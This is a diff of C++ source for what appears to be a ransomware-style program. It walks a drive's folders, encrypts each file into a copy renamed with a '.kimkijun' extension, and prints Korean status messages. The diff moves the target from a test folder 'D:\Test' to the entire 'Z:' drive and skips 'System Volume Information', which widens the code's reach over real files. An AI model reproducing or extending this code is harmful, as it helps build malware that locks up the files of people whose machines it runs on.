@@ -48,7 +48,7 @@ public:
 		while (_findnext(handle, &fd) == 0)
 		{
 			cout << fd.name << endl;
-			if (string(fd.name)=="..")
+			if (string(fd.name) == ".." || string(fd.name) == "System Volume Information")
 				continue;
 			else
 				list1.push_back(setpath(startpath+"\\", fd.name));
@@ -69,14 +69,7 @@ public:
 
 			cout << "암호화 할 파일명" << var.c_str() << endl;
 
-			if (OpenFile == nullptr)
-			{
-				cout << endl << endl << "다른 폴더로 !!" << endl << endl;
-
-				cout << var << "파일이 존재하지 않습니다." << endl;
-				dirList(var);
-			}
-			else
+			if (OpenFile != nullptr)
 			{
 				CName = var + ".kimkijun";
 				cout << "암호화된 파일명 : " << CName << endl;
@@ -94,6 +87,14 @@ public:
 				fclose(initialStream);
 
 				fclose(WriteFile);
+
+			}
+			else
+			{
+				cout << endl << endl << "다른 폴더로 !!" << endl << endl;
+
+				cout << var << "파일이 존재하지 않습니다." << endl;
+				dirList(var);
 			}
 		}
 	}
@@ -104,6 +105,6 @@ public:
 int main(void)
 {
 	File a;
-	a.dirList("D:\\Test");
+	a.dirList("Z:");
 	return 0;
 }
